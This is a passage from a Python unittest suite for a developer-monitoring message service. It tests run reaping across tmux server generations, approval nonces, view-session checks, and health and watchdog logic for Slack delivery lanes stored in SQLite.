        MSG.reap_runs({'p1:@7', 'p1:@42'}, now=self._future())
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')

    def test_reap_grace_uses_started_at_not_created(self):
        # round 7 High1: even if launching is delayed and created_at is old, immediately after recording the target (started_at)
        # grace must protect it. Reap must use only started_at (created_at would interrupt → double execution).
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@42')     # started_at = now
        with MSG._conn() as c:                            # backdate created_at by two minutes (launch-delay simulation)
            c.execute("UPDATE runs SET created_at=? WHERE run_id=?",
                      (MSG.iso(MSG.now_utc() - timedelta(seconds=120)), res['run_id']))
        # the window is absent from the snapshot (straddle), now = started_at + 5s (< grace)
        MSG.reap_runs(set(), now=MSG.now_utc() + timedelta(seconds=5))
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')

    def test_reap_generation_distinguishes_reused_window_id(self):
        # round 7 High2: a server restart reuses window_id (@0) → distinguish by pid (generation). The stale generation (p1:@0)
        # is absent from new-generation alive set (p2:@0), so interrupt it; retain the new run (p2:@0) → prevents killing the wrong window.
        a = self._action(event_id='a1', group_key='ga')
        ra = MSG.redeem_approval(a, MSG.issue_approval(a, self.cfg)['nonce'], self.cfg)
        b = self._action(event_id='a2', group_key='gb')
        rb = MSG.redeem_approval(b, MSG.issue_approval(b, self.cfg)['nonce'], self.cfg)
        MSG.run_mark_running(ra['run_id'], 'p1:@0')       # old server generation
        MSG.run_mark_running(rb['run_id'], 'p2:@0')       # new server generation (same window_id, different pid)
        MSG.reap_runs({'p2:@0'}, now=self._future())      # only the new server exists
        self.assertEqual(MSG.get_run(ra['run_id'])['status'], 'interrupted')  # stale generation terminated
        self.assertEqual(MSG.get_run(rb['run_id'])['status'], 'running')      # new run retained

    def test_reap_never_terminates_legacy_target(self):
        # round 8 defense: a generationless legacy format (@N) cannot be compared to a new pid:@N key → the reaper never terminates it
        # (clearing a live card lock = double-execution risk). Do not suffix-adopt because it reopens High2.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], '@42')        # legacy format (no colon)
        MSG.reap_runs({'12345:@42'}, now=self._future())  # new generation key — does not exact-match legacy
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')  # not terminated
        card = MSG._conn().execute('SELECT run_id FROM cards WHERE card_id=?', (cid,)).fetchone()
        self.assertEqual(card['run_id'], res['run_id'])   # card lock retained → prevents double execution

    # ---- view-session decision — the path that lets the modal view only that run's window ----
    def _running(self, target, event_id='v1', group_key='gv'):
        cid = self._action(event_id=event_id, group_key=group_key)
        res = MSG.redeem_approval(cid, MSG.issue_approval(cid, self.cfg)['nonce'], self.cfg)
        if target is not None:
            MSG.run_mark_running(res['run_id'], target)
        return res['run_id']

    def test_view_request_ok(self):
        rid = self._running('p1:@42')
        ok, p = MSG.run_view_request(MSG.get_run(rid), {'p1:@42'}, 'devmon-exec')
        self.assertTrue(ok)
        self.assertEqual(p['view'], 'devmon-view-' + rid)
        self.assertEqual(p['window_id'], '@42')
        self.assertEqual(p['target'], 'p1:@42')

    def test_view_request_stale_generation(self):
        # a different window inherited @42 after server restart — attaching based only on window_id would view another run.
        rid = self._running('p1:@42')
        ok, err = MSG.run_view_request(MSG.get_run(rid), {'p9:@42'}, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'stale_generation')

    def test_view_request_window_gone(self):
        rid = self._running('p1:@42')
        ok, err = MSG.run_view_request(MSG.get_run(rid), set(), 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'stale_generation')

    def test_view_request_legacy_target_format(self):
        # a legacy target without a generation (pid) cannot be compared → never attach it
        rid = self._running('@42')
        ok, err = MSG.run_view_request(MSG.get_run(rid), {'p1:@42'}, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'stale_target_format')

    def test_view_request_launching_when_targetless(self):
        rid = self._running(None)                       # starting, target NULL
        ok, err = MSG.run_view_request(MSG.get_run(rid), {'p1:@42'}, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'launching')

    def test_view_request_tmux_unavailable_is_not_stale(self):
        # mistaking an indeterminate alive query (None) for 'no window' blocks viewing a live run → defer the decision
        rid = self._running('p1:@42')
        ok, err = MSG.run_view_request(MSG.get_run(rid), None, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'tmux_unavailable')

    def test_view_request_not_active_after_finish(self):
        rid = self._running('p1:@42')
        MSG.run_finish(rid, 0)
        ok, err = MSG.run_view_request(MSG.get_run(rid), {'p1:@42'}, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'not_active')

    def test_view_request_not_found(self):
        ok, err = MSG.run_view_request(None, set(), 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'not_found')

    def test_view_session_name_survives_devterm_normalization(self):
        # devterm-shell converts [^A-Za-z0-9_-] to '_' — if a view name leaves that character set,
        # a wrong session (devmon-view-run_2026…) is silently created.
        rid = self._running('p1:@42')
        name = MSG.run_view_session(rid)
        self.assertEqual(name, re.sub(r'[^A-Za-z0-9_-]', '_', name))
        self.assertTrue(name.startswith(MSG.VIEW_SESSION_PREFIX))

    def test_active_view_sessions_tracks_lifecycle(self):
        a = self._running('p1:@1', event_id='va', group_key='gva')
        b = self._running('p1:@2', event_id='vb', group_key='gvb')
        self.assertEqual(MSG.active_view_sessions(),
                         {'devmon-view-' + a, 'devmon-view-' + b})
        MSG.run_finish(a, 0)
        self.assertEqual(MSG.active_view_sessions(), {'devmon-view-' + b})
        MSG.run_stop(b)
        self.assertEqual(MSG.active_view_sessions(), set())

    def test_link_not_executable(self):
        MSG.ingest(msg(kind='link'))
        cid = MSG._conn().execute("SELECT card_id FROM cards WHERE kind='link'").fetchone()['card_id']
        res = MSG.issue_approval(cid, self.cfg)
        self.assertEqual(res['error'], 'not_executable')

    def test_skill_drift_invalidates_nonce(self):
        # the card's own action changes after approval → the re-derived SHA disagrees → plan_stale.
        # Drifting the card (not the config) is the case that matters: what the owner read and
        # clicked is no longer what would run.
        cid = self._action(skill='harness-gardener')
        appr = MSG.issue_approval(cid, self.cfg)
        row = MSG._conn().execute('SELECT action_json FROM cards WHERE card_id=?', (cid,)).fetchone()
        action = json.loads(row['action_json'])
        action['skill'] = 'other-skill'
        with MSG._conn() as conn:
            conn.execute('UPDATE cards SET action_json=? WHERE card_id=?',
                         (json.dumps(action), cid))
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertEqual(res['error'], 'plan_stale')


class TestDeliveryLaneHealth(unittest.TestCase):
    def setUp(self):
        fresh_db()
        self.now = MSG.now_utc()

    def _delivery(self, card_id, channel, status, created=None, sent=None,
                  error=None, error_at=None, next_attempt=None):
        MSG._conn().execute(
            'INSERT INTO deliveries(card_id, channel, status, created_at, sent_at, '
            'last_error, last_error_at, next_attempt_at) VALUES(?,?,?,?,?,?,?,?)',
            (card_id, channel, status, created, sent, error, error_at, next_attempt))
        MSG._conn().commit()

    def test_zero_row_lane_is_idle_with_complete_shape(self):
        self.assertEqual(MSG.delivery_lane_health('slack-routine', self.now), {
            'delivery_state': 'idle',
            'last_success_at': None,
            'last_success_age_seconds': None,
            'pending_count': 0,
            'oldest_pending_age_seconds': None,
            'last_error': None,
            'last_error_at': None,
            'consecutive_failures': 0,
            'terminal_failures_since_success': 0,
            'ledger_error_count': 0,
        })

    def test_health_timestamp_sql_acceptance_is_python_canonical_subset(self):
        # Differential oracle over the boundary cross-product, not seven examples:
        # every value accepted by health SQL must also be accepted by Python. SQL
        # may reject other valid RFC3339 spellings because the persisted ledger
        # contract is deliberately narrower than the producer parser.
        years = (0, 1, 4, 100, 400, 1899, 1900, 1999, 2000, 2024, 2026, 9999, 10000)
        months = (0, 1, 2, 4, 6, 9, 11, 12, 13)
        days = (0, 1, 28, 29, 30, 31, 32)
        hours = (0, 12, 23, 24)
        minutes = (0, 1, 58, 59, 60)
        seconds = (0, 1, 58, 59, 60)
        values = (
            ('%04d-%02d-%02dT%02d:%02d:%02d.000000Z' % parts,)
            for parts in itertools.product(
                years, months, days, hours, minutes, seconds))
        conn = MSG._conn()
        conn.execute('CREATE TEMP TABLE health_timestamp_oracle(value TEXT PRIMARY KEY)')
        conn.executemany('INSERT INTO health_timestamp_oracle(value) VALUES(?)', values)
        predicate = MSG._health_timestamp_valid_sql('value')
        accepted = [row[0] for row in conn.execute(
            'SELECT value FROM health_timestamp_oracle WHERE ' + predicate)]
        unsafe = []
        for value in accepted:
            try:
                MSG.parse_rfc3339(value)
            except ValueError:
                unsafe.append(value)
        self.assertGreater(len(accepted), 1000)
        self.assertEqual(unsafe, [])

    def test_health_orders_and_counts_only_normalized_timestamp_values(self):
        at = MSG.parse_rfc3339('2026-08-17T12:00:00Z')
        self._delivery('invalid-hour-success', 'slack-routine', 'sent',
                       sent='2026-08-17T24:00:00.000000Z')
        self._delivery('invalid-time-only', 'slack-routine', 'sent', sent='00:00:00Z')
        self._delivery('invalid-offset-success', 'slack-routine', 'sent',
                       sent='2026-08-17T09:00:00.000000+09:00')
        self._delivery('valid-older-success', 'slack-routine', 'sent',
                       sent='2026-08-17T00:45:00.000000Z')
        newest_success = '2026-08-17T01:00:00.000000Z'
        self._delivery('valid-newest-success', 'slack-routine', 'sent', sent=newest_success)
        self._delivery('failure-before', 'slack-routine', 'failed', error='http 404',
                       error_at='2026-08-17T00:30:00.000000Z')
        self._delivery('failure-after-z', 'slack-routine', 'failed', error='http 404',
                       error_at='2026-08-17T02:00:00.000000Z')
        self._delivery('failure-invalid-offset', 'slack-routine', 'failed', error='http 500',
                       error_at='2026-08-17T12:00:00.000000+09:00')
        newest_error = '2026-08-17T03:00:00.000000Z'
        self._delivery('failure-after-newest', 'slack-routine', 'failed', error='http 503',
                       error_at=newest_error)

        health = MSG.delivery_lane_health('slack-routine', at)
        self.assertEqual(health['last_success_at'], newest_success)
        self.assertEqual(health['last_error_at'], newest_error)
        self.assertEqual(health['last_error'], 'http 503')
        self.assertEqual(health['consecutive_failures'], 2)
        self.assertEqual(health['terminal_failures_since_success'], 2)
        self.assertEqual(health['ledger_error_count'], 4)
        self.assertEqual(
            MSG.lane_watchdog_reason('slack-routine', 'on', at)['state'],
            'ledger-invalid')

    def test_future_pending_timestamp_age_is_clamped_to_zero(self):
        future = MSG.iso(self.now + timedelta(minutes=10))
        self._delivery('future-pending', 'slack-routine', 'pending',
                       created=future, next_attempt=future)
        self.assertEqual(
            MSG.delivery_lane_health('slack-routine', self.now)[
                'oldest_pending_age_seconds'],
            0)

    def test_future_success_timestamp_age_is_clamped_to_zero(self):
        future = MSG.iso(self.now + timedelta(minutes=4))
        self._delivery('future-success', 'slack-routine', 'sent', sent=future)
        self.assertEqual(
            MSG.delivery_lane_health('slack-routine', self.now)[
                'last_success_age_seconds'],
            0)

    def test_health_fields_are_read_in_one_sql_snapshot(self):
        real_conn = MSG._conn()
        connection = unittest.mock.Mock(wraps=real_conn)
        with unittest.mock.patch.object(MSG, '_conn', return_value=connection):
            MSG.delivery_lane_health('slack-routine', self.now)
        self.assertEqual(connection.execute.call_count, 1)

    def test_sent_only_lane_reports_success_without_pending_age(self):
        sent = MSG.iso(self.now - timedelta(minutes=4))
        self._delivery('sent', 'slack-urgent', 'sent', sent=sent)
        health = MSG.delivery_lane_health('slack-urgent', self.now)
        self.assertEqual(health['delivery_state'], 'sent')
        self.assertEqual(health['last_success_at'], sent)
        self.assertEqual(health['pending_count'], 0)
        self.assertIsNone(health['oldest_pending_age_seconds'])
        self.assertEqual(health['consecutive_failures'], 0)
        self.assertEqual(health['terminal_failures_since_success'], 0)

    def test_stale_429_before_a_later_success_is_not_rate_limited(self):
        error_at = MSG.iso(self.now - timedelta(minutes=20))
        sent_at = MSG.iso(self.now - timedelta(minutes=10))
        self._delivery('old-429', 'slack-urgent', 'pending',
                       created=MSG.iso(self.now - timedelta(hours=1)),
                       error='http 429', error_at=error_at,
                       next_attempt=MSG.iso(self.now - timedelta(minutes=15)))
        self._delivery('later-success', 'slack-urgent', 'sent', sent=sent_at)
        self._delivery('fresh', 'slack-urgent', 'pending', created=sent_at,
                       next_attempt=MSG.iso(self.now + timedelta(seconds=10)))
        health = MSG.delivery_lane_health('slack-urgent', self.now)
        self.assertEqual(health['delivery_state'], 'pending')
        self.assertEqual(health['last_success_at'], sent_at)
        self.assertEqual(health['consecutive_failures'], 0)
        self.assertEqual(health['terminal_failures_since_success'], 0)

    def test_health_is_derived_per_lane_and_counts_failures_after_last_success(self):
        success = MSG.iso(self.now - timedelta(minutes=30))
        before_success = MSG.iso(self.now - timedelta(minutes=40))
        after_success = MSG.iso(self.now - timedelta(minutes=20))
        oldest = MSG.iso(self.now - timedelta(minutes=10))
        newer = MSG.iso(self.now - timedelta(minutes=5))
        newest = MSG.iso(self.now - timedelta(minutes=2))
        legacy_next_attempt = MSG.iso(self.now - timedelta(minutes=8))
        self._delivery('sent', 'slack-urgent', 'sent', sent=success)
        self._delivery('old-failure', 'slack-urgent', 'failed',
                       error='http 500', error_at=before_success)
        self._delivery('pending-rate', 'slack-urgent', 'pending', created=oldest,
                       error='http 429', error_at=after_success,
                       next_attempt=MSG.iso(self.now + timedelta(minutes=50)))
        # A migrated row may have no created_at; its pending age falls back to next_attempt_at.
        self._delivery('legacy-pending', 'slack-urgent', 'claimed', created=None,
                       error='http 429', error_at=newer,
                       next_attempt=legacy_next_attempt)
        # A newer non-429 error must not hide another open row parked by Retry-After.
        self._delivery('newer-server-error', 'slack-urgent', 'pending', created=newest,
                       error='http 500', error_at=newest,
                       next_attempt=MSG.iso(self.now + timedelta(seconds=30)))
        self._delivery('other-lane', 'slack-routine', 'failed',
                       error='http 400', error_at=newer)

        health = MSG.delivery_lane_health('slack-urgent', self.now)
        self.assertEqual(health['delivery_state'], 'rate-limited')
        self.assertEqual(health['last_success_at'], success)
        self.assertEqual(health['pending_count'], 3)
        self.assertGreaterEqual(health['oldest_pending_age_seconds'], 599)
        self.assertLessEqual(health['oldest_pending_age_seconds'], 600)
        self.assertEqual(health['last_error'], 'http 500')
        self.assertEqual(health['last_error_at'], newest)
        self.assertEqual(health['consecutive_failures'], 3)
        self.assertEqual(health['terminal_failures_since_success'], 0)


class TestLaneProbesAndWatchdogState(unittest.TestCase):
    def setUp(self):
        fresh_db()
        self.now = MSG.now_utc()

    def _delivery(self, card_id, channel, status, created=None, sent=None,
                  error=None, error_at=None, next_attempt=None):
        MSG._conn().execute(
            'INSERT INTO deliveries(card_id, channel, status, created_at, sent_at, '
            'last_error, last_error_at, next_attempt_at) VALUES(?,?,?,?,?,?,?,?)',
            (card_id, channel, status, created, sent, error, error_at, next_attempt))
        MSG._conn().commit()

    def _card(self, card_id, created, read=True):
        MSG._conn().execute(
            'INSERT INTO cards(card_id, group_key, source, kind, urgency, title, '
            'created_at, received_at, read_at, pinned, occurrence_count, last_seen) '
            'VALUES(?,?,?,?,?,?,?,?,?,?,?,?)',
            (card_id, card_id, 'test', 'info', 'normal', card_id, created, created,
             created if read else None, 0, 1, created))
        MSG._conn().commit()

    def test_probe_is_already_read_and_feed_count_stays_consistent(self):
        before = MSG.counts()
        card_id = MSG.maybe_enqueue_lane_probe('slack-routine', self.now)
        self.assertIsNotNone(card_id)
        card = MSG._conn().execute(
            'SELECT * FROM cards WHERE card_id=?', (card_id,)).fetchone()
        self.assertEqual(card['group_key'], 'dev-monitor:lane-probe:slack-routine')
        self.assertEqual(card['source'], 'dev-monitor-probe')
        self.assertEqual(card['urgency'], 'normal')
        self.assertEqual(card['pinned'], 0)
        self.assertEqual(card['read_at'], MSG.iso(self.now))
        self.assertIsNone(card['action_digest'])
        # The probe declares itself a record: receiving it IS the proof, so there is
        # nothing for a person to do and it must not hold the needs-me count up.
        self.assertEqual(card['needs_action'], 0)
        self.assertEqual(MSG._conn().execute(
            'SELECT COUNT(*) FROM occurrences WHERE card_id=?', (card_id,)).fetchone()[0], 0)
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE card_id=? AND kind='lane_probe'",
            (card_id,)).fetchone()[0], 1)
        delivery = MSG._conn().execute(
            'SELECT channel, status FROM deliveries WHERE card_id=?', (card_id,)).fetchone()
        self.assertEqual((delivery['channel'], delivery['status']),
                         ('slack-routine', 'pending'))
        after = MSG.counts()
        self.assertEqual(after['active'], before['active'] + 1)
        for key in ('unread', 'action', 'link', 'urgent', 'archived'):
            self.assertEqual(after[key], before[key])
        self.assertEqual(MSG.unread_count(), 0)
        feed = MSG.feed()
        self.assertEqual([m['card_id'] for m in feed['messages']], [card_id])
        self.assertEqual(feed['counts']['active'], len(feed['messages']))

    def test_probe_recent_success_and_failed_probe_both_suppress_repeats(self):
        recent = MSG.iso(self.now - timedelta(hours=1))
        self._delivery('recent-success', 'slack-routine', 'sent', sent=recent)
        self.assertIsNone(MSG.maybe_enqueue_lane_probe('slack-routine', self.now))

        first = MSG.maybe_enqueue_lane_probe('slack-urgent', self.now)
        MSG._conn().execute(
            "UPDATE deliveries SET status='failed', last_error='http 400', "
            'last_error_at=? WHERE card_id=?', (MSG.iso(self.now), first))
        MSG._conn().commit()
        self.assertIsNone(MSG.maybe_enqueue_lane_probe(
            'slack-urgent', self.now + timedelta(minutes=15)))
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-probe'"
        ).fetchone()[0], 1)

    def test_probe_uses_newest_of_multiple_valid_successes(self):
        self._delivery(
            'outside-window', 'slack-routine', 'sent',
            sent=MSG.iso(self.now - timedelta(hours=25)))
        self._delivery(
            'inside-window', 'slack-routine', 'sent',
            sent=MSG.iso(self.now - timedelta(hours=1)))
        self.assertIsNone(MSG.maybe_enqueue_lane_probe('slack-routine', self.now))

    def test_probe_ignores_lexically_high_invalid_success(self):
        self._delivery('invalid-latest', 'slack-routine', 'sent',
                       sent='2026-08-17T24:00:00Z')
        self.assertIsNotNone(MSG.maybe_enqueue_lane_probe('slack-routine', self.now))

    def test_probe_direct_insert_survives_window_shorter_than_coalescing(self):
        with unittest.mock.patch.dict(
                MSG.LANE_PROBE_WINDOWS, {'slack-routine': timedelta(seconds=1)}):
            first = MSG.maybe_enqueue_lane_probe('slack-routine', self.now)
            second = MSG.maybe_enqueue_lane_probe(
                'slack-routine', self.now + timedelta(seconds=2))
        self.assertNotEqual(first, second)
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM deliveries WHERE channel='slack-routine'"
        ).fetchone()[0], 2)

    def test_probe_is_archived_by_existing_read_card_sweep(self):
        old = self.now - timedelta(hours=50)
        probe = MSG.maybe_enqueue_lane_probe('slack-routine', old)
        fresh = MSG.iso(self.now)
        for index in range(MSG.ARCHIVE_ACTIVE_MIN):
            self._card('fresh-%d' % index, fresh)
        with unittest.mock.patch.object(MSG, 'now_utc', return_value=self.now):
            MSG.sweep()
        row = MSG._conn().execute(
            'SELECT archived_at FROM cards WHERE card_id=?', (probe,)).fetchone()
        self.assertIsNotNone(row['archived_at'])
        self.assertEqual(MSG.counts()['active'], MSG.ARCHIVE_ACTIVE_MIN)

    def test_watchdog_names_old_rate_limit_stall_and_stale_success(self):
        old = MSG.iso(self.now - timedelta(minutes=31))
        future = MSG.iso(self.now + timedelta(minutes=20))
        self._delivery('limited', 'slack-routine', 'pending', created=old,
                       error='http 429', error_at=old, next_attempt=future)
        limited = MSG.lane_watchdog_reason('slack-routine', 'on', self.now)
        self.assertEqual(limited['state'], 'rate-limited')

        self._delivery('stalled', 'slack-urgent', 'pending', created=old,
                       next_attempt=old)
        stalled = MSG.lane_watchdog_reason('slack-urgent', 'on', self.now)
        self.assertEqual(stalled['state'], 'stalled')

        MSG._conn().execute("DELETE FROM deliveries WHERE channel='slack-urgent'")
        stale = MSG.iso(self.now - timedelta(days=9))
        self._delivery('stale', 'slack-urgent', 'sent', sent=stale)
        self.assertEqual(
            MSG.lane_watchdog_reason('slack-urgent', 'on', self.now)['state'], 'stale')
        self.assertIsNone(MSG.lane_watchdog_reason(
            'slack-urgent', 'on', self.now - timedelta(days=2)))
        self.assertIsNone(MSG.lane_watchdog_reason(
            'slack-urgent', 'off: no webhook configured', self.now))

    def test_watchdog_detects_terminal_failure_before_first_success(self):
        failed_at = MSG.iso(self.now)
        self._delivery('never-worked', 'slack-routine', 'failed', error='http 400',
                       error_at=failed_at)
        self._delivery('fresh-pending', 'slack-routine', 'pending',
                       created=failed_at, next_attempt=failed_at)
        reason = MSG.lane_watchdog_reason('slack-routine', 'on', self.now)
        self.assertEqual(reason['state'], 'failed')
        self.assertIn('before the lane ever succeeded', reason['detail'])

    def test_watchdog_counts_legacy_terminal_failure_without_error_timestamp(self):
        failed_at = MSG.iso(self.now)
        self._delivery('legacy-failed', 'slack-routine', 'failed', error='http 400')
        self._delivery('fresh-pending', 'slack-routine', 'pending',
                       created=failed_at, next_attempt=failed_at)
        health = MSG.delivery_lane_health('slack-routine', self.now)
        self.assertEqual(health['terminal_failures_since_success'], 1)
        self.assertEqual(
            MSG.lane_watchdog_reason('slack-routine', 'on', self.now)['state'], 'failed')

        self._delivery('first-success', 'slack-routine', 'sent', sent=failed_at)
        health = MSG.delivery_lane_health('slack-routine', self.now)
        self.assertEqual(health['terminal_failures_since_success'], 0)
        self.assertIsNone(MSG.lane_watchdog_reason('slack-routine', 'on', self.now))

    def test_watchdog_does_not_turn_one_terminal_card_failure_into_lane_failure(self):
        recent = MSG.iso(self.now - timedelta(minutes=1))
        failed_at = MSG.iso(self.now)
        self._delivery('recent-success', 'slack-urgent', 'sent', sent=recent)
        self._delivery('bad-card', 'slack-urgent', 'failed', error='http 400',
                       error_at=failed_at)
        self.assertIsNone(MSG.lane_watchdog_reason('slack-urgent', 'on', self.now))

    def test_watchdog_detects_repeated_terminal_failures_after_last_success(self):
        recent = MSG.iso(self.now - timedelta(minutes=2))
        self._delivery('recent-success', 'slack-urgent', 'sent', sent=recent)
        for index in range(2):
            failed_at = MSG.iso(self.now - timedelta(seconds=10 - index))
            self._delivery('bad-card-%d' % index, 'slack-urgent', 'failed',
                           error='http 400', error_at=failed_at)
        reason = MSG.lane_watchdog_reason('slack-urgent', 'on', self.now)
        self.assertEqual(reason['state'], 'failed')
        self.assertIn('after the last success', reason['detail'])

    def test_watchdog_turns_malformed_sent_timestamp_into_one_named_incident(self):
        self._delivery('malformed-success', 'slack-routine', 'sent', sent='not-rfc3339')
        self._delivery(
            'timezone-less-success', 'slack-routine', 'sent',
            sent='2026-08-17T00:00:00')
        health = MSG.delivery_lane_health('slack-routine', self.now)
        self.assertEqual(health['ledger_error_count'], 2)
        self.assertIsNone(health['last_success_at'])
        reason = MSG.lane_watchdog_reason('slack-routine', 'on', self.now)
        self.assertEqual(reason['state'], 'ledger-invalid')
        self.assertIn('2 retained delivery rows', reason['detail'])

        first, created = MSG.record_lane_watchdog('slack-routine', reason, self.now)
        self.assertTrue(created)
        second = MSG.record_lane_watchdog(
            'slack-routine', reason, self.now + timedelta(hours=24))
        self.assertEqual(second, (first, False))
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchone()[0], 1)
        self.assertIsNotNone(MSG.maybe_enqueue_lane_probe('slack-routine', self.now))

    def test_malformed_only_ledger_is_not_reported_idle(self):
        self._delivery('malformed-only', 'slack-routine', 'sent',
                       sent='2026-08-17T24:00:00Z')
        health = MSG.delivery_lane_health('slack-routine', self.now)
        self.assertEqual(health['ledger_error_count'], 1)
        self.assertNotEqual(health['delivery_state'], 'idle')

    def test_delivery_lane_health_plan_uses_targeted_indexes_with_scan_control(self):
        statements = []
        conn = MSG._conn()
        conn.set_trace_callback(statements.append)
        try:
            MSG.delivery_lane_health('slack-routine', self.now)
        finally:
            conn.set_trace_callback(None)
        sql = next(statement for statement in statements
                   if statement.startswith('WITH valid_success'))
        production = '\n'.join(
            row['detail'] for row in conn.execute('EXPLAIN QUERY PLAN ' + sql).fetchall())
        self.assertNotIn('SCAN deliveries', production)
        self.assertNotIn('USE TEMP B-TREE', production)
        for index in (
                'idx_deliveries_health_sent_v3', 'idx_deliveries_claim',
                'idx_deliveries_health_error_valid_v3',
                'idx_deliveries_health_failed_v3',
                'idx_deliveries_health_bad_timestamp_v3'):
            self.assertIn(index, production)
        known_bad = '\n'.join(row['detail'] for row in conn.execute(
            'EXPLAIN QUERY PLAN SELECT * FROM deliveries NOT INDEXED WHERE channel=?',
            ('slack-routine',)).fetchall())
        self.assertIn('SCAN deliveries', known_bad)

    def test_watchdog_coalesces_one_sweepable_active_incident(self):
        reason = {'state': 'stalled', 'detail': 'oldest open delivery is 1801 seconds old'}
        first, created = MSG.record_lane_watchdog('slack-urgent', reason, self.now)
        self.assertTrue(created)
        self.assertEqual(MSG._conn().execute(
            'SELECT pinned FROM cards WHERE card_id=?', (first,)).fetchone()['pinned'], 0)
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM events WHERE card_id=? AND kind='lane_watchdog'",
            (first,)).fetchone()[0], 1)
        self.assertEqual(MSG._conn().execute(
            'SELECT COUNT(*) FROM deliveries WHERE card_id=?', (first,)).fetchone()[0], 0)
        self.assertTrue(MSG.enqueue_lane_watchdog_notice(first, 'slack-routine'))
        self.assertFalse(MSG.enqueue_lane_watchdog_notice(first, 'slack-routine'))
        self.assertEqual(MSG._conn().execute(
            'SELECT channel FROM deliveries WHERE card_id=?', (first,)).fetchone()[0],
            'slack-routine')
        self.assertEqual(MSG.record_lane_watchdog(
            'slack-urgent', reason, self.now + timedelta(minutes=29)), (first, False))
        self.assertEqual(MSG.record_lane_watchdog(
            'slack-urgent', reason, self.now + timedelta(minutes=31)), (first, False))
        row = MSG._conn().execute(
            'SELECT pinned, occurrence_count, last_seen FROM cards WHERE card_id=?',
            (first,)).fetchone()
        self.assertEqual(row['pinned'], 0)
        self.assertEqual(row['occurrence_count'], 1)
        self.assertEqual(row['last_seen'], MSG.iso(self.now + timedelta(minutes=31)))
        self.assertEqual(MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE source='dev-monitor-watchdog'"
        ).fetchone()[0], 1)

        MSG.mark_read(first)
        sweep_at = self.now + timedelta(hours=80)
        for index in range(MSG.ARCHIVE_ACTIVE_MIN):
            self._card('fresh-watchdog-%d' % index, MSG.iso(sweep_at))
        with unittest.mock.patch.object(MSG, 'now_utc', return_value=sweep_at):
            MSG.sweep()
        self.assertIsNotNone(MSG._conn().execute(
            'SELECT archived_at FROM cards WHERE card_id=?', (first,)).fetchone()['archived_at'])

    def test_watchdog_namespace_does_not_overwrite_producer_card(self):
        group_key = 'dev-monitor:lane-watchdog:slack-urgent'
        expected_id = group_key + ':' + self.now.strftime('%Y%m%dT%H%M%SZ')
        with self.assertRaisesRegex(MSG.ValidationError, 'reserved group_key'):
            MSG.ingest(msg(event_id='ordinary-event', group_key=group_key, kind='info'))
        created = MSG.iso(self.now)
        with MSG._conn() as conn:
            conn.execute(
                'INSERT INTO cards(card_id, group_key, source, kind, urgency, title, '
                'created_at, received_at, pinned, occurrence_count, last_seen) '
                'VALUES(?,?,?,?,?,?,?,?,?,?,?)',
                (expected_id, group_key, 'resource', 'info', 'normal', 'Legacy producer',
                 created, created, 0, 1, created))

        reason = {'state': 'failed', 'detail': 'test namespace collision'}
        watchdog_id, was_created = MSG.record_lane_watchdog('slack-urgent', reason, self.now)
        self.assertTrue(was_created)
        self.assertEqual(watchdog_id, expected_id + ':1')
        producer = MSG._conn().execute(
            'SELECT source, title, archived_at FROM cards WHERE card_id=?',
            (expected_id,)).fetchone()
        self.assertEqual((producer['source'], producer['title'], producer['archived_at']),
                         ('resource', 'Legacy producer', None))
        watchdog = MSG._conn().execute(
            'SELECT source FROM cards WHERE card_id=?', (watchdog_id,)).fetchone()
        self.assertEqual(watchdog['source'], 'dev-monitor-watchdog')
        with self.assertRaisesRegex(MSG.ValidationError, 'reserved event_id'):
            MSG.ingest(msg(event_id=watchdog_id, group_key='ordinary:producer', kind='info'))
        self.assertEqual(MSG.resolve_lane_watchdog('slack-urgent', self.now), 1)
        self.assertIsNone(MSG._conn().execute(
            'SELECT archived_at FROM cards WHERE card_id=?',
            (expected_id,)).fetchone()['archived_at'])

    def test_watchdog_normalizes_pre_correction_duplicate_pinned_cards(self):
        group_key = 'dev-monitor:lane-watchdog:slack-routine'
        oldest = MSG.iso(self.now - timedelta(hours=1))
        newer = MSG.iso(self.now - timedelta(minutes=30))
        with MSG._conn() as conn:
            for card_id, created, occurrences in (
                    ('old-watchdog', oldest, 2), ('new-watchdog', newer, 3)):
                conn.execute(
                    'INSERT INTO cards(card_id, group_key, source, kind, urgency, title, '
                    'created_at, received_at, pinned, occurrence_count, last_seen) '
                    'VALUES(?,?,?,?,?,?,?,?,?,?,?)',
                    (card_id, group_key, 'dev-monitor-watchdog', 'info', 'urgent',
                     'old projection', created, created, 1, occurrences, created))
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, sent_at) '
                'VALUES(?,?,?,?,?)',
                ('new-watchdog', 'slack-urgent', 'sent', newer, newer))
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, '
                'next_attempt_at) VALUES(?,?,?,?,?)',
                ('new-watchdog', 'slack-urgent', 'pending', newer, newer))
            conn.execute(
                'INSERT INTO deliveries(card_id, channel, status, created_at, last_error) '
                'VALUES(?,?,?,?,?)',
                ('new-watchdog', 'slack-urgent', 'failed', newer, 'http 404'))

        reason = {'state': 'failed', 'detail': 'continuing failure'}
